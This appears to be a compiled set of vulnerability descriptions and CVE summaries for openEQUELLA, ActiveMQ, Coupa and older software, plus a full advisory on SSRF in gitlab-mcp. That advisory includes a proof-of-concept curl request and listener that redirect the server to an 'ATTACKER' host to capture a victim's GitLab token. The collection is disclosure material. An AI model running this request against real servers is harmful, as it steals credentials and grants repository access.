cves.summary: In openEQUELLA before 2026.2, the pre-login notice is stored as HTML and rendered on the legacy logon page without encoding or sanitisation. A user holding the EDIT_SYSTEM_SETTINGS permission can set a notice containing an arbitrary script (PUT /api/preloginnotice), resulting in stored cross-site scripting on the login page. Unauthenticated exploitation is possible where EDIT_SYSTEM_SETTINGS has been granted to the guest user or Everyone

In openEQUELLA before 2026.1, the pre-login notice image upload endpoint (PUT /api/preloginnotice/image/{name}) does not validate the type of uploaded files and serves them with a Content-Type derived from the supplied filename. A user holding the EDIT_SYSTEM_SETTINGS permission can upload an HTML file that is then served as text/html from the openEQUELLA origin, resulting in stored cross-site scripting. Unauthenticated exploitation is possible where EDIT_SYSTEM_SETTINGS has been granted to the guest user or everyone.

In openEQUELLA before 2026.1, the GET /api/userquery/userinfobackup endpoint performs no authentication or authorisation check. An unauthenticated attacker who supplies another user's uniqueId can retrieve that user's stored personal details (username, first name, last name and email address) within the same institution.

In openEQUELLA before 2026.1, the SOAP API parses XML supplied in the stopEdit operation with a parser that resolves external entities. This allows an attacker to read arbitrary files accessible to the openEQUELLA service or cause the server to issue requests to attacker-specified locations (SSRF).

In openEQUELLA before 2026.1, the system.execute() function available to the scripting engine runs supplied operating system commands without validation or an allow-list of permitted executables. A user able to create or edit scripts can use it to execute arbitrary commands with the privileges of the openEQUELLA service account.

In openEQUELLA before 2026.1, the XML parser used for item metadata does not disable external entity resolution. A user permitted to create items (CREATE_ITEM) can submit crafted XML to POST /api/item and cause the server to read arbitrary files accessible to the openEQUELLA service, or make requests to attacker-specified locations (SSRF), including cloud instance metadata services.
The Gopher service is running.
News Manager Lite 2.5 allows remote attackers to bypass authentication and gain administrator privileges by setting the ADMIN parameter in the NEWS_LOGIN cookie.
Directory traversal vulnerability in xweb 1.0 allows remote attackers to download arbitrary files via a .. (dot dot) in the URL.
During a reboot after an installation of Linux Slackware 3.6, a remote attacker can obtain root access by logging in to the root account without a password.
The ping utility in networking_utils.php in Sourcecraft Networking_Utils 1.0 allows remote attackers to read arbitrary files via shell metacharacters in the Domain name or IP address argument.
Unknown vulnerability in Parallel port powerSwitch (aka pp_powerSwitch) 0.1 does not properly enforce access controls, which allows local users to access arbitrary ports.

Buffer overflow in CHttpServer::OnParseError in the ISAPI extension (Isapi.cpp) when built using Microsoft Foundation Class (MFC) static libraries in Visual C++ 5.0, and 6.0 before SP3, as used in multiple products including BadBlue, allows remote attackers to cause a denial of service (access violation and crash) and possibly execute arbitrary code via a long query string that causes a parsing error.
The FTP service in Zaurus PDAs SL-5000D and SL-5500 does not require authentication, which allows remote attackers to access the file system as root.

Sharp Zaurus PDA SL-5000D and SL-5500 uses a salt of "A0" to encrypt the screen-locking password as stored in the Security.conf file, which makes it easier for local users to guess the password via brute force methods.

Multiple buffer overflows in (1) tetrinet_inmessage, (2) speclist_add and (3) config-getthemeinfo of GTetrinet 0.4.3 and earlier allow remote attackers to casue a denial of service and possibly execute arbitrary code.

Samsung SmartEther SS6215S switch, and possibly other Samsung switches, allows remote attackers and local users to gain administrative access by providing the admin username followed by a password that is the maximum allowed length, then pressing the enter key after the resulting error message.

modules.php in PHP-Nuke Video Gallery Module 0.1 Beta 5 allows remote attackers to gain sensitive information via an HTTP request with an invalid (1) catid or (2) clipid parameter, which reveals the full path in an error message.

sngrep through 1.8.4 contains stack buffer overflow vulnerabilities in SIP attribute formatting routines when header values exceed the 255-byte buffer limit. Attackers can craft malicious SIP packets with oversized Call-ID, X-Call-ID, or other header fields to overflow stack buffers and cause crashes or execute arbitrary code during packet parsing and rendering.
Off-by-one buffer overflow in the context_action function in context.c of Logsurfer 1.41 through 1.5a allows remote attackers to cause a denial of service (crash) via a malformed log entry.
rhmask 1.0-9 in Red Hat Linux 7.1 allows local users to overwrite arbitrary files via a symlink attack on the mask file.

# Server-Side Request Forgery via X-GitLab-API-URL Header Allows Credential Theft

## Affected

- **Repository:** `zereight/gitlab-mcp`
- **Affected versions:** All versions through commit `74a8c83`
- **Patched versions:** None at time of report

## Severity

High. CVSS v3.1 8.5 (`AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N`)

## Description

When the environment variable `ENABLE_DYNAMIC_API_URL=true` is set, the server
reads the `X-GitLab-API-URL` HTTP request header and uses it as the base URL for
all outbound GitLab API calls made within that request. The server validates that
the value is a well-formed URL (`new URL(dynamicApiUrl)`) but applies no
allowlist or hostname restriction. The server then attaches the victim's
`Private-Token` to every outbound fetch that uses the redirected URL.

Any caller who can reach the HTTP transport can set `X-GitLab-API-URL` to an
attacker-controlled host. The next GitLab API call the server makes delivers the
victim's token to that host.

The vulnerable code appears at two locations.

**SSE handler (`index.ts:11541`):**

```typescript
const dynamicApiUrl = req.headers["x-gitlab-api-url"]?.trim();
if (ENABLE_DYNAMIC_API_URL && dynamicApiUrl) {
  apiUrl = normalizeGitLabApiUrl(dynamicApiUrl);   // no allowlist check
}
```

**Streamable HTTP handler (`index.ts:11787`), inside `parseAuthHeaders`:**

```typescript
const dynamicApiUrl = req.headers["x-gitlab-api-url"]?.trim();
if (ENABLE_DYNAMIC_API_URL && dynamicApiUrl) {
  new URL(dynamicApiUrl);                          // syntax-only check
  apiUrl = normalizeGitLabApiUrl(dynamicApiUrl);   // any reachable host accepted
}
```

In both cases, `apiUrl` propagates through `getEffectiveApiUrl()` and into
`getFetchConfig()`, which attaches `Private-Token: <victim_token>` to every
outbound fetch. The token reaches the attacker's host, not GitLab.

## Proof of Concept

Run upstream `zereight/gitlab-mcp` at commit `74a8c83` with
`ENABLE_DYNAMIC_API_URL=true` and `REMOTE_AUTHORIZATION=true`.

```bash
# 1. Start a listener on the attacker host (port 9099)
#    Any HTTP server that logs incoming headers will work.
python3 -c "
import http.server, sys
class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        print('HEADERS:', dict(self.headers))
        self.send_response(200); self.end_headers()
http.server.HTTPServer(('0.0.0.0', 9099), H).serve_forever()
"

# 2. Send any MCP tool call with the malicious header
curl -X POST http://TARGET:3002/mcp \
  -H "X-GitLab-API-URL: http://ATTACKER:9099/api/v4" \
  -H "Authorization: Bearer ANY_VALID_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"jsonrpc":"2.0","method":"tools/call","params":{"name":"list_issues","arguments":{"project_id":"1"}},"id":1}'
```

The listener receives:

```
GET /api/v4/projects/1/issues HTTP/1.1
private-token: <VICTIM_GITLAB_TOKEN>
Host: ATTACKER:9099
```

The victim's token arrives at the attacker host. The attacker never needed it
in advance. The MCP server delivered it.

## Impact

The attacker obtains the victim's GitLab Personal Access Token or CI/CD job
token in a single request. With the stolen token they gain full GitLab API
access at the victim's permission level: read of all repositories, issues,
merge requests, CI/CD pipeline definitions and variables/secrets; write to push
code, modify pipelines, create or delete resources, and rotate CI/CD variables.

CVSS factors:
- `PR:L`: reaching the HTTP transport requires presenting some auth token
- `S:C`: the attack crosses the boundary into GitLab (a separate security domain)
- `C:H`: victim's GitLab token stolen in one request; full read of all scoped data
- `I:H`: attacker can push code and modify pipelines with the stolen token
- `A:N`: the MCP server continues operating normally

## Why This Is a Vulnerability, Not Intended Behavior

`ENABLE_DYNAMIC_API_URL` is documented for supporting self-hosted GitLab
instances at a non-default base URL. The intended caller behavior is to supply
the URL of their own GitLab instance. The feature has no mechanism to distinguish
a legitimate self-hosted GitLab URL from an attacker-controlled host. Once
enabled, every request that includes `X-GitLab-API-URL` can redirect the server's
credential-carrying outbound calls to any reachable host with no restriction.

PR #453 (merged) added a startup guard that blocks the Streamable HTTP transport
from running with static tokens unless `REMOTE_AUTHORIZATION=true` or OAuth is
configured. That guard runs once at server startup and checks transport
configuration. It does not modify `parseAuthHeaders`, does not validate
`X-GitLab-API-URL`, and does not restrict the token-forwarding path at runtime.
The SSRF sink at `index.ts:11787` is unchanged in the current code and fully
reachable in the documented multi-user deployment mode (`REMOTE_AUTHORIZATION=true`).

## Remediation

Validate `X-GitLab-API-URL` against a configurable allowlist of trusted GitLab
hostnames before assigning the value to `apiUrl`. Reject any request whose
`X-GitLab-API-URL` hostname is not in the allowlist. Apply this check at both
`index.ts:11541` and `index.ts:11787`.

Example fix for the Streamable HTTP handler:

```typescript
const ALLOWED_HOSTS = (process.env.GITLAB_ALLOWED_HOSTS ?? "")
  .split(",").map(h => h.trim()).filter(Boolean);

const dynamicApiUrl = req.headers["x-gitlab-api-url"]?.trim();
if (ENABLE_DYNAMIC_API_URL && dynamicApiUrl) {
  const parsed = new URL(dynamicApiUrl);
  if (!ALLOWED_HOSTS.includes(parsed.hostname)) {
    throw new Error(`X-GitLab-API-URL hostname not in allowlist: ${parsed.hostname}`);
  }
  apiUrl = normalizeGitLabApiUrl(dynamicApiUrl);
}
```

Document `GITLAB_ALLOWED_HOSTS` in the README alongside `ENABLE_DYNAMIC_API_URL`.
If maintaining an allowlist is not feasible, disable `ENABLE_DYNAMIC_API_URL` by
default and document the token-forwarding risk prominently.

A reflected Cross-Site Scripting (XSS) vulnerability in the Tenders module of the Coupa Supplier Portal SaaS platform. The vulnerability arises because the `list_item_function` parameter is reflected in the server’s response without proper output encoding or sanitisation, and is directly embedded within the context of a JavaScript event handler. An attacker with a low-privileged account could create a malicious URL containing JavaScript payloads which, when opened by a victim, would execute arbitrary scripts within the context of the victim’s browser. A successful exploit could allow the attacker to perform actions on the victim’s behalf, disclose accessible information or manipulate the user interface.

The PFI plugin framework deployment routine does not validate path components when extracting archive entries to the local plugin repository. Archive entries containing relative path segments such as '..' are not rejected, allowing an unauthenticated local attacker to write files outside the plugin repository to arbitrary locations accessible with the current user's permissions which could result in full system compromise.

Improper input validation vulnerability in Apache ActiveMQ, Apache ActiveMQ KahaDB.

A user can create a durable subscription with a clientId and subscription name that have a combined length > 65,535 (while separately being shorter) on a broker using KahaDB which can cause the broker to shutdown and be unrecoverable. 

This issue affects Apache ActiveMQ: from 6.0.0 before 6.3.3, before 5.19.12; Apache ActiveMQ KahaDB: from 6.0.0 before 6.3.3, before 5.19.12.

Users are recommended to upgrade to version 6.4.0, 6.3.3 or 5.19.12, which fixes the issue.

Sogou Input Method for Windows contains a vulnerability in the configuration retrieval mechanism of its SGTool.exe component. The application retrieves configuration data over unencrypted HTTP connections, allowing an attacker capable of manipulating network traffic to replace legitimate server responses with malicious configurations. An attacker can exploit this vulnerability to instruct SGTool.exe to download attacker-controlled files to arbitrary locations, including paths used by legitimate application components. This can result in arbitrary code execution when the downloaded files are subsequently executed or loaded by the application.

The Slim Jetpack plugin for WordPress is vulnerable to Stored Cross-Site Scripting via the 'g<PAGE_ID>-website (Website contact-field)' parameter in all versions up to, and including, 2.7.0.1 due to insufficient input sanitization and output escaping. This makes it possible for unauthenticated attackers to inject arbitrary web scripts in pages that will execute whenever a user accesses an injected page. The nonce and authentication checks on form submission are only enforced for logged-in users, allowing unauthenticated visitors to store payloads via any page containing the [contact-form] shortcode.

CSV formula injection vulnerability in the export functionality of the Coupa Supplier Portal SaaS platform. The vulnerability arises because certain user-controlled data, such as event names or templates within the Tenders module, are not properly validated or sanitised before being included in CSV files generated by the application. An attacker with low privileges can input specially crafted values that begin with characters interpreted as formulas by spreadsheet applications. When a victim downloads and opens the generated file in a compatible client, the content may be interpreted as a formula, potentially leading to unauthorised actions such as the execution of commands via mechanisms such as DDE, access to information, or interaction with system resources under the victim’s context.

Server-side request forgery (SSRF) vulnerability in the Coupa Supplier Portal SaaS platform, specifically in the document conversion functionality available in the ‘Contracts > Templates’ section. The vulnerability is due to insufficient validation of references to external resources processed by the Aspose.Words for Java library during DOCX-to-PDF conversion. An authenticated attacker with permissions to modify templates could upload a specially crafted DOCX document containing references to external resources, which would cause the server-side application to access URLs controlled by the attacker, resources on the internal network, or local files. A successful exploit could lead to the disclosure of sensitive information, such as configuration files, system files, credentials, environment variables and endpoints for internal services.

Improper invalidation of cached authorizations vulnerability in Apache ActiveMQ, Apache ActiveMQ Runtime Config.

After the runtime configuration plugin removes a principal's write grant on a destination, an authenticated connection opened before the change can keep sending to that destination, including through a new anonymous producer, while fresh connections and new explicit producers are denied.

This issue affects Apache ActiveMQ: from 6.0.0 before 6.3.3, before 5.19.12; Apache ActiveMQ Runtime Config: from 6.0.0 before 6.3.3, before 5.19.12.

Users are recommended to upgrade to version 6.4.0, 6.3.3 or 5.19.12, which fixes the issue.
